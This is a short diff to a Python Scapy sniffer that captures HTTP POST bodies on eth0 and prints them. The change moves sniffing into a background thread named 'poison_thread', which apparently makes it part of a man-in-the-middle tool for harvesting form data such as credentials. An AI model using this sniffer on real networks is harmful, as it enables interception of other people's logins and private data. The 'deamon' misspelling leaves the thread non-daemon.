@@ -25,4 +25,9 @@ def sniffData(pkt):
                         data = header.split(bytes('\r\n\r\n','utf-8'))[1]
                         print(("[%s] POST data Captured: %s" % (src, data)))
                         print('------------------------------------')
-sniff(iface="eth0", prn=sniffData)
+def startSniff():
+    sniff(iface="eth0", prn=sniffData)
+def launchSniff():
+    poison_thread = threading.Thread(target=startSniff, args=())
+    poison_thread.deamon = True
+    poison_thread.start()
